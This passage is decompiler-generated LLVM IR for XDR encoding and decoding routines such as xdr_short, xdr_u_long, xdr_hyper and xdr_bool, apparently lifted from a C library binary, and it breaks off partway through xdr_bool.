  uselistorder label %bb3, { 3, 0, 1, 2 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i16, align 2
  %stack_var_-12 = alloca i32, align 4
  %v3_314f4 = load i32, i32* @r4, align 4
  store i32 %v3_314f4, i32* %stack_var_-12, align 4
  %v0_314f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_314f8 = inttoptr i32 %v0_314f8 to i32*
  %v2_314f8 = load i32, i32* %v1_314f8, align 4
  store i32 %v2_314f8, i32* %r4.global-to-local, align 4
  %v7_314fc = icmp eq i32 %v2_314f8, 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_314fc, label %dec_label_pc_31540, label %dec_label_pc_3150c

dec_label_pc_3150c:                               ; preds = %entry
  %v2_314fc = icmp eq i32 %v2_314f8, 0
  br i1 %v2_314fc, label %dec_label_pc_31520, label %dec_label_pc_31510

dec_label_pc_31510:                               ; preds = %dec_label_pc_3150c
  %v7_31510 = icmp eq i32 %v2_314f8, 2
  br i1 %v7_31510, label %bb, label %dec_label_pc_31568

bb:                                               ; preds = %dec_label_pc_31510
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3156c

dec_label_pc_31520:                               ; preds = %dec_label_pc_3150c
  %v3_31520 = load i16, i16* %tmp, align 2
  store i16 %v3_31520, i16* %stack_var_-20, align 2
  %v1_3152c = add i32 %v0_314f8, 4
  %v2_3152c = inttoptr i32 %v1_3152c to i32*
  %v3_3152c = load i32, i32* %v2_3152c, align 4
  %v1_31530 = add i32 %v3_3152c, 4
  %v2_31530 = inttoptr i32 %v1_31530 to i32*
  %v3_31530 = load i32, i32* %v2_31530, align 4
  call void @__pseudo_branch(i32 %v3_31530)
  br label %dec_label_pc_3156c

dec_label_pc_31540:                               ; preds = %entry
  %v1_31540 = add i32 %v0_314f8, 4
  %v2_31540 = inttoptr i32 %v1_31540 to i32*
  %v3_31540 = load i32, i32* %v2_31540, align 4
  %v1_31548 = inttoptr i32 %v3_31540 to i32*
  %v2_31548 = load i32, i32* %v1_31548, align 4
  call void @__pseudo_branch(i32 %v2_31548)
  %v0_31554 = load i32, i32* %r0.global-to-local, align 4
  %v2_31554 = icmp eq i32 %v0_31554, 0
  br i1 %v2_31554, label %dec_label_pc_31568, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_31540
  %v4_31558 = load i16, i16* %stack_var_-20, align 2
  %v1_3155c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v1_3155c, i32* %r0.global-to-local, align 4
  %v3_31560 = load i32, i32* %r5.global-to-local, align 4
  %v4_31560 = inttoptr i32 %v3_31560 to i16*
  store i16 %v4_31558, i16* %v4_31560, align 2
  br label %dec_label_pc_3156c

dec_label_pc_31568:                               ; preds = %dec_label_pc_31540, %dec_label_pc_31510
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3156c

dec_label_pc_3156c:                               ; preds = %.thread3, %bb, %dec_label_pc_31520, %dec_label_pc_31568
  %v2_31570 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_31570, i32* %r4.global-to-local, align 4
  %v1_31574 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_31574

; uselistorder directives
  uselistorder i32 %v2_314f8, { 0, 2, 1, 3 }
  uselistorder i16* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_3156c, { 3, 0, 2, 1 }
}

define i32 @__GI_xdr_int() local_unnamed_addr {
entry:
  %v0_31578 = call i32 @__GI_xdr_long()
  ret i32 %v0_31578
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_3157c = load i32, i32* @r4, align 4
  store i32 %v3_3157c, i32* %stack_var_-12, align 4
  %v0_31580 = load i32, i32* @r0, align 4
  %v1_31580 = inttoptr i32 %v0_31580 to i32*
  %v2_31580 = load i32, i32* %v1_31580, align 4
  store i32 %v2_31580, i32* %r4.global-to-local, align 4
  %v7_31584 = icmp eq i32 %v2_31580, 1
  %v0_3158c = load i32, i32* @r1, align 4
  store i32 %v0_3158c, i32* %r5.global-to-local, align 4
  br i1 %v7_31584, label %dec_label_pc_315a8, label %dec_label_pc_31594

dec_label_pc_31594:                               ; preds = %entry
  %v2_31584 = icmp eq i32 %v2_31580, 0
  br i1 %v2_31584, label %dec_label_pc_315d4, label %dec_label_pc_31598

dec_label_pc_31598:                               ; preds = %dec_label_pc_31594
  %v7_31598 = icmp eq i32 %v2_31580, 2
  br i1 %v7_31598, label %bb, label %dec_label_pc_315e8

bb:                                               ; preds = %dec_label_pc_31598
  store i32 1, i32* @r0, align 4
  br label %dec_label_pc_315ec

dec_label_pc_315a8:                               ; preds = %entry
  %v1_315a8 = add i32 %v0_31580, 4
  %v2_315a8 = inttoptr i32 %v1_315a8 to i32*
  %v3_315a8 = load i32, i32* %v2_315a8, align 4
  %v1_315b0 = inttoptr i32 %v3_315a8 to i32*
  %v2_315b0 = load i32, i32* %v1_315b0, align 4
  call void @__pseudo_branch(i32 %v2_315b0)
  %v0_315bc = load i32, i32* @r0, align 4
  %v2_315bc = icmp eq i32 %v0_315bc, 0
  br i1 %v2_315bc, label %dec_label_pc_315e8, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_315a8
  %v4_315c0 = load i32, i32* %stack_var_-20, align 4
  %v1_315c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v1_315c4, i32* @r0, align 4
  %v2_315c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_315c8 = inttoptr i32 %v2_315c8 to i32*
  store i32 %v4_315c0, i32* %v3_315c8, align 4
  br label %dec_label_pc_315ec

dec_label_pc_315d4:                               ; preds = %dec_label_pc_31594
  %v1_315d4 = add i32 %v0_31580, 4
  %v2_315d4 = inttoptr i32 %v1_315d4 to i32*
  %v3_315d4 = load i32, i32* %v2_315d4, align 4
  %v1_315d8 = add i32 %v3_315d4, 4
  %v2_315d8 = inttoptr i32 %v1_315d8 to i32*
  %v3_315d8 = load i32, i32* %v2_315d8, align 4
  call void @__pseudo_branch(i32 %v3_315d8)
  br label %dec_label_pc_315ec

dec_label_pc_315e8:                               ; preds = %dec_label_pc_315a8, %dec_label_pc_31598
  store i32 0, i32* @r0, align 4
  br label %dec_label_pc_315ec

dec_label_pc_315ec:                               ; preds = %.thread2, %bb, %dec_label_pc_315d4, %dec_label_pc_315e8
  %v2_315f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_315f0, i32* @r4, align 4
  %v1_315f4 = load i32, i32* @r0, align 4
  ret i32 %v1_315f4

; uselistorder directives
  uselistorder i32 %v2_31580, { 0, 2, 1, 3 }
  uselistorder i32 %v0_31580, { 1, 0, 2 }
  uselistorder label %dec_label_pc_315ec, { 3, 2, 0, 1 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_315f8 = call i32 @xdr_u_long()
  ret i32 %v0_315f8
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_315fc = load i32, i32* @r4, align 4
  store i32 %v3_315fc, i32* %stack_var_-20, align 4
  %v0_31600 = load i32, i32* @r0, align 4
  %v1_31600 = inttoptr i32 %v0_31600 to i32*
  %v2_31600 = load i32, i32* %v1_31600, align 4
  store i32 %v2_31600, i32* %r7.global-to-local, align 4
  %v2_31604 = icmp eq i32 %v2_31600, 0
  store i32 %v0_31600, i32* %r5.global-to-local, align 4
  %v0_31610 = load i32, i32* @r1, align 4
  store i32 %v0_31610, i32* %r6.global-to-local, align 4
  br i1 %v2_31604, label %dec_label_pc_31618, label %dec_label_pc_3166c

dec_label_pc_31618:                               ; preds = %entry
  %v1_31618 = inttoptr i32 %v0_31610 to i32*
  %v2_31618 = load i32, i32* %v1_31618, align 4
  %v1_3161c = add i32 %v0_31610, 4
  %v2_3161c = inttoptr i32 %v1_3161c to i32*
  %v3_3161c = load i32, i32* %v2_3161c, align 4
  store i32 %v2_31618, i32* %stack_var_-32, align 4
  store i32 %v3_3161c, i32* %stack_var_-28, align 4
  %v1_31628 = add i32 %v0_31600, 4
  %v2_31628 = inttoptr i32 %v1_31628 to i32*
  %v3_31628 = load i32, i32* %v2_31628, align 4
  %v3_3162c = ashr i32 %v3_3161c, 31
  store i32 %v3_3162c, i32* %r4.global-to-local, align 4
  %v1_31630 = add i32 %v3_31628, 4
  %v2_31630 = inttoptr i32 %v1_31630 to i32*
  %v3_31630 = load i32, i32* %v2_31630, align 4
  call void @__pseudo_branch(i32 %v3_31630)
  %v0_3163c = load i32, i32* @r0, align 4
  %v2_3163c = icmp eq i32 %v0_3163c, 0
  br i1 %v2_3163c, label %bb, label %dec_label_pc_31648

bb:                                               ; preds = %dec_label_pc_31618
  %v1_31640 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_31640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

dec_label_pc_31648:                               ; preds = %dec_label_pc_31618
  %v0_31648 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_31648, i32* %r0.global-to-local, align 4
  %v1_3164c = add i32 %v0_31648, 4
  %v2_3164c = inttoptr i32 %v1_3164c to i32*
  %v3_3164c = load i32, i32* %v2_3164c, align 4
  %v1_31654 = add i32 %v3_3164c, 4
  %v2_31654 = inttoptr i32 %v1_31654 to i32*
  %v3_31654 = load i32, i32* %v2_31654, align 4
  call void @__pseudo_branch(i32 %v3_31654)
  %v0_31660 = load i32, i32* %r0.global-to-local, align 4
  %v2_31660 = icmp eq i32 %v0_31660, 0
  br i1 %v2_31660, label %dec_label_pc_316e4, label %bb10

bb10:                                             ; preds = %dec_label_pc_31648
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

dec_label_pc_3166c:                               ; preds = %entry
  %v7_3166c = icmp eq i32 %v2_31600, 1
  br i1 %v7_3166c, label %dec_label_pc_31674, label %dec_label_pc_316d0

dec_label_pc_31674:                               ; preds = %dec_label_pc_3166c
  %v1_31674 = add i32 %v0_31600, 4
  %v2_31674 = inttoptr i32 %v1_31674 to i32*
  %v3_31674 = load i32, i32* %v2_31674, align 4
  %v1_3167c = inttoptr i32 %v3_31674 to i32*
  %v2_3167c = load i32, i32* %v1_3167c, align 4
  call void @__pseudo_branch(i32 %v2_3167c)
  %v0_31688 = load i32, i32* @r0, align 4
  %v2_31688 = icmp eq i32 %v0_31688, 0
  br i1 %v2_31688, label %dec_label_pc_316e0, label %dec_label_pc_31690

dec_label_pc_31690:                               ; preds = %dec_label_pc_31674
  %v0_31690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_31690, i32* %r0.global-to-local, align 4
  %v1_31694 = add i32 %v0_31690, 4
  %v2_31694 = inttoptr i32 %v1_31694 to i32*
  %v3_31694 = load i32, i32* %v2_31694, align 4
  %v1_3169c = inttoptr i32 %v3_31694 to i32*
  %v2_3169c = load i32, i32* %v1_3169c, align 4
  call void @__pseudo_branch(i32 %v2_3169c)
  %v0_316a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_316a8 = icmp eq i32 %v0_316a8, 0
  br i1 %v2_316a8, label %dec_label_pc_316e0, label %dec_label_pc_316b0

dec_label_pc_316b0:                               ; preds = %dec_label_pc_31690
  %v2_316b0 = load i32, i32* %stack_var_-32, align 4
  %v5_316b0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v5_316b0, i32* %r4.global-to-local, align 4
  %v0_316c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_316c4, i32* %r0.global-to-local, align 4
  %v0_316c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_316c8 = inttoptr i32 %v0_316c8 to i32*
  store i32 %v2_316b0, i32* %v1_316c8, align 4
  %v3_316c8 = add i32 %v0_316c8, 4
  %v4_316c8 = inttoptr i32 %v3_316c8 to i32*
  %v5_316c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_316c8, i32* %v4_316c8, align 4
  %v1_316ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

dec_label_pc_316d0:                               ; preds = %dec_label_pc_3166c
  %v7_316d0 = icmp eq i32 %v2_31600, 2
  br i1 %v7_316d0, label %.thread1, label %bb11

bb11:                                             ; preds = %dec_label_pc_316d0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

.thread1:                                         ; preds = %dec_label_pc_316d0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

dec_label_pc_316e0:                               ; preds = %dec_label_pc_31690, %dec_label_pc_31674
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_316e4

dec_label_pc_316e4:                               ; preds = %bb, %bb11, %.thread1, %bb10, %dec_label_pc_31648, %dec_label_pc_316b0, %dec_label_pc_316e0
  %v1_316ec = phi i32 [ 1, %.thread1 ], [ 0, %bb11 ], [ 1, %bb10 ], [ 0, %dec_label_pc_31648 ], [ %v1_31640, %bb ], [ %v1_316ec.pre, %dec_label_pc_316b0 ], [ 0, %dec_label_pc_316e0 ]
  %v2_316e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_316e8, i32* %r4.global-to-local, align 4
  ret i32 %v1_316ec

; uselistorder directives
  uselistorder i32 %v0_31600, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_316e4, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_316f0 = load i32, i32* @r4, align 4
  store i32 %v3_316f0, i32* %stack_var_-16, align 4
  %v0_316f4 = load i32, i32* @r0, align 4
  %v1_316f4 = inttoptr i32 %v0_316f4 to i32*
  %v2_316f4 = load i32, i32* %v1_316f4, align 4
  store i32 %v2_316f4, i32* %r5.global-to-local, align 4
  %v2_316f8 = icmp eq i32 %v2_316f4, 0
  store i32 %v0_316f4, i32* %r4.global-to-local, align 4
  %v0_31704 = load i32, i32* @r1, align 4
  store i32 %v0_31704, i32* %r6.global-to-local, align 4
  br i1 %v2_316f8, label %dec_label_pc_3170c, label %dec_label_pc_31760

dec_label_pc_3170c:                               ; preds = %entry
  %v1_3170c = inttoptr i32 %v0_31704 to i32*
  %v2_3170c = load i32, i32* %v1_3170c, align 4
  %v1_31710 = add i32 %v0_31704, 4
  %v2_31710 = inttoptr i32 %v1_31710 to i32*
  %v3_31710 = load i32, i32* %v2_31710, align 4
  store i32 %v2_3170c, i32* %stack_var_-24, align 4
  store i32 %v3_31710, i32* %stack_var_-20, align 4
  %v1_31720 = add i32 %v0_316f4, 4
  %v2_31720 = inttoptr i32 %v1_31720 to i32*
  %v3_31720 = load i32, i32* %v2_31720, align 4
  %v1_31724 = add i32 %v3_31720, 4
  %v2_31724 = inttoptr i32 %v1_31724 to i32*
  %v3_31724 = load i32, i32* %v2_31724, align 4
  call void @__pseudo_branch(i32 %v3_31724)
  %v0_31730 = load i32, i32* @r0, align 4
  %v2_31730 = icmp eq i32 %v0_31730, 0
  br i1 %v2_31730, label %bb, label %dec_label_pc_3173c

bb:                                               ; preds = %dec_label_pc_3170c
  %v1_31734 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_31734, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

dec_label_pc_3173c:                               ; preds = %dec_label_pc_3170c
  %v0_3173c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_3173c, i32* %r0.global-to-local, align 4
  %v1_31740 = add i32 %v0_3173c, 4
  %v2_31740 = inttoptr i32 %v1_31740 to i32*
  %v3_31740 = load i32, i32* %v2_31740, align 4
  %v1_31748 = add i32 %v3_31740, 4
  %v2_31748 = inttoptr i32 %v1_31748 to i32*
  %v3_31748 = load i32, i32* %v2_31748, align 4
  call void @__pseudo_branch(i32 %v3_31748)
  %v0_31754 = load i32, i32* %r0.global-to-local, align 4
  %v2_31754 = icmp eq i32 %v0_31754, 0
  br i1 %v2_31754, label %dec_label_pc_317d8, label %bb9

bb9:                                              ; preds = %dec_label_pc_3173c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

dec_label_pc_31760:                               ; preds = %entry
  %v7_31760 = icmp eq i32 %v2_316f4, 1
  br i1 %v7_31760, label %dec_label_pc_31768, label %dec_label_pc_317c4

dec_label_pc_31768:                               ; preds = %dec_label_pc_31760
  %v1_31768 = add i32 %v0_316f4, 4
  %v2_31768 = inttoptr i32 %v1_31768 to i32*
  %v3_31768 = load i32, i32* %v2_31768, align 4
  %v1_31770 = inttoptr i32 %v3_31768 to i32*
  %v2_31770 = load i32, i32* %v1_31770, align 4
  call void @__pseudo_branch(i32 %v2_31770)
  %v0_3177c = load i32, i32* @r0, align 4
  %v2_3177c = icmp eq i32 %v0_3177c, 0
  br i1 %v2_3177c, label %dec_label_pc_317d4, label %dec_label_pc_31784

dec_label_pc_31784:                               ; preds = %dec_label_pc_31768
  %v0_31784 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_31784, i32* %r0.global-to-local, align 4
  %v1_31788 = add i32 %v0_31784, 4
  %v2_31788 = inttoptr i32 %v1_31788 to i32*
  %v3_31788 = load i32, i32* %v2_31788, align 4
  %v1_31790 = inttoptr i32 %v3_31788 to i32*
  %v2_31790 = load i32, i32* %v1_31790, align 4
  call void @__pseudo_branch(i32 %v2_31790)
  %v0_3179c = load i32, i32* %r0.global-to-local, align 4
  %v2_3179c = icmp eq i32 %v0_3179c, 0
  br i1 %v2_3179c, label %dec_label_pc_317d4, label %dec_label_pc_317a4

dec_label_pc_317a4:                               ; preds = %dec_label_pc_31784
  %v2_317a4 = load i32, i32* %stack_var_-24, align 4
  %v5_317a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v5_317a4, i32* %r4.global-to-local, align 4
  %v0_317b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_317b8, i32* %r0.global-to-local, align 4
  %v0_317bc = load i32, i32* %r6.global-to-local, align 4
  %v1_317bc = inttoptr i32 %v0_317bc to i32*
  store i32 %v2_317a4, i32* %v1_317bc, align 4
  %v3_317bc = add i32 %v0_317bc, 4
  %v4_317bc = inttoptr i32 %v3_317bc to i32*
  %v5_317bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_317bc, i32* %v4_317bc, align 4
  %v1_317e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

dec_label_pc_317c4:                               ; preds = %dec_label_pc_31760
  %v7_317c4 = icmp eq i32 %v2_316f4, 2
  br i1 %v7_317c4, label %.thread1, label %bb10

bb10:                                             ; preds = %dec_label_pc_317c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

.thread1:                                         ; preds = %dec_label_pc_317c4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

dec_label_pc_317d4:                               ; preds = %dec_label_pc_31784, %dec_label_pc_31768
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_317d8

dec_label_pc_317d8:                               ; preds = %bb, %bb10, %.thread1, %bb9, %dec_label_pc_3173c, %dec_label_pc_317a4, %dec_label_pc_317d4
  %v1_317e0 = phi i32 [ 1, %.thread1 ], [ 0, %bb10 ], [ 1, %bb9 ], [ 0, %dec_label_pc_3173c ], [ %v1_31734, %bb ], [ %v1_317e0.pre, %dec_label_pc_317a4 ], [ 0, %dec_label_pc_317d4 ]
  %v2_317dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_317dc, i32* %r4.global-to-local, align 4
  ret i32 %v1_317e0

; uselistorder directives
  uselistorder i32 %v0_31704, { 1, 0, 2 }
  uselistorder i32 %v0_316f4, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_317d8, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_317e4 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_317e4
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_317e8 = call i32 @xdr_u_hyper()
  ret i32 %v0_317e8
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i16, align 2
  %stack_var_-12 = alloca i32, align 4
  %v3_317ec = load i32, i32* @r4, align 4
  store i32 %v3_317ec, i32* %stack_var_-12, align 4
  %v0_317f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_317f0 = inttoptr i32 %v0_317f0 to i32*
  %v2_317f0 = load i32, i32* %v1_317f0, align 4
  store i32 %v2_317f0, i32* %r4.global-to-local, align 4
  %v7_317f4 = icmp eq i32 %v2_317f0, 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_317f4, label %dec_label_pc_31838, label %dec_label_pc_31804

dec_label_pc_31804:                               ; preds = %entry
  %v2_317f4 = icmp eq i32 %v2_317f0, 0
  br i1 %v2_317f4, label %dec_label_pc_31818, label %dec_label_pc_31808

dec_label_pc_31808:                               ; preds = %dec_label_pc_31804
  %v7_31808 = icmp eq i32 %v2_317f0, 2
  br i1 %v7_31808, label %bb, label %dec_label_pc_31860

bb:                                               ; preds = %dec_label_pc_31808
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31864

dec_label_pc_31818:                               ; preds = %dec_label_pc_31804
  %v3_31818 = load i16, i16* %tmp, align 2
  store i16 %v3_31818, i16* %stack_var_-20, align 2
  %v1_31824 = add i32 %v0_317f0, 4
  %v2_31824 = inttoptr i32 %v1_31824 to i32*
  %v3_31824 = load i32, i32* %v2_31824, align 4
  %v1_31828 = add i32 %v3_31824, 4
  %v2_31828 = inttoptr i32 %v1_31828 to i32*
  %v3_31828 = load i32, i32* %v2_31828, align 4
  call void @__pseudo_branch(i32 %v3_31828)
  br label %dec_label_pc_31864

dec_label_pc_31838:                               ; preds = %entry
  %v1_31838 = add i32 %v0_317f0, 4
  %v2_31838 = inttoptr i32 %v1_31838 to i32*
  %v3_31838 = load i32, i32* %v2_31838, align 4
  %v1_31840 = inttoptr i32 %v3_31838 to i32*
  %v2_31840 = load i32, i32* %v1_31840, align 4
  call void @__pseudo_branch(i32 %v2_31840)
  %v0_3184c = load i32, i32* %r0.global-to-local, align 4
  %v2_3184c = icmp eq i32 %v0_3184c, 0
  br i1 %v2_3184c, label %dec_label_pc_31860, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_31838
  %v4_31850 = load i16, i16* %stack_var_-20, align 2
  %v1_31854 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v1_31854, i32* %r0.global-to-local, align 4
  %v3_31858 = load i32, i32* %r5.global-to-local, align 4
  %v4_31858 = inttoptr i32 %v3_31858 to i16*
  store i16 %v4_31850, i16* %v4_31858, align 2
  br label %dec_label_pc_31864

dec_label_pc_31860:                               ; preds = %dec_label_pc_31838, %dec_label_pc_31808
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31864

dec_label_pc_31864:                               ; preds = %.thread3, %bb, %dec_label_pc_31818, %dec_label_pc_31860
  %v2_31868 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_31868, i32* %r4.global-to-local, align 4
  %v1_3186c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_3186c

; uselistorder directives
  uselistorder i32 %v2_317f0, { 0, 2, 1, 3 }
  uselistorder i16* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_31864, { 3, 0, 2, 1 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_31870 = load i32, i32* @r4, align 4
  store i32 %v3_31870, i32* %stack_var_-8, align 4
  %v3_31874 = load i8, i8* %arg1, align 1
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i8 %v3_31874, i8* %stack_var_-12, align 1
  %v0_31888 = call i32 @__GI_xdr_int()
  store i32 %v0_31888, i32* %r0.global-to-local, align 4
  %v2_3188c = icmp eq i32 %v0_31888, 0
  br i1 %v2_3188c, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_31890 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_31898 = load i32, i32* %r4.global-to-local, align 4
  %v4_31898 = inttoptr i32 %v3_31898 to i8*
  store i8 %v4_31890, i8* %v4_31898, align 1
  %v1_318a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v1_318a4 = phi i32 [ 0, %entry ], [ %v1_318a4.pre, %bb ]
  %v2_318a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_318a0, i32* %r4.global-to-local, align 4
  ret i32 %v1_318a4

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %v3_318ac = load i8, i8* %arg1, align 1
  store i32 %tmp, i32* @r4, align 4
  store i8 %v3_318ac, i8* %stack_var_-12, align 1
  %v8_318bc = ptrtoint i8* %stack_var_-12 to i32
  store i32 %v8_318bc, i32* @r1, align 4
  %v2_318c0 = bitcast i8* %stack_var_-12 to i32*
  %v4_318c0 = call i32 @xdr_u_int(i32* %v2_318c0, i32* %v2_318c0)
  store i32 %v4_318c0, i32* %r0.global-to-local, align 4
  %v2_318c4 = icmp eq i32 %v4_318c0, 0
  br i1 %v2_318c4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_318c8 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_318d0 = load i32, i32* @r4, align 4
  %v4_318d0 = inttoptr i32 %v3_318d0 to i8*
  store i8 %v4_318c8, i8* %v4_318d0, align 1
  %v1_318dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v1_318dc = phi i32 [ 0, %entry ], [ %v1_318dc.pre, %bb ]
  ret i32 %v1_318dc

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 3, 0, 1, 2 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_318e0 = load i32, i32* @r4, align 4
  store i32 %v3_318e0, i32* %stack_var_-12, align 4
  %v0_318e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_318e4 = inttoptr i32 %v0_318e4 to i32*
  %v2_318e4 = load i32, i32* %v1_318e4, align 4
  store i32 %v2_318e4, i32* %r4.global-to-local, align 4
  %v7_318e8 = icmp eq i32 %v2_318e4, 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_318e8, label %dec_label_pc_31934, label %dec_label_pc_318f8

dec_label_pc_318f8:                               ; preds = %entry
  %v2_318e8 = icmp eq i32 %v2_318e4, 0
  br i1 %v2_318e8, label %dec_label_pc_3190c, label %dec_label_pc_318fc

dec_label_pc_318fc:                               ; preds = %dec_label_pc_318f8
  %v7_318fc = icmp eq i32 %v2_318e4, 2
  br i1 %v7_318fc, label %bb, label %dec_label_pc_31968

bb:                                               ; preds = %dec_label_pc_318fc
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3196c

dec_label_pc_3190c:                               ; preds = %dec_label_pc_318f8
  %v1_3190c = inttoptr i32 %arg2 to i32*
  %v2_3190c = load i32, i32* %v1_3190c, align 4
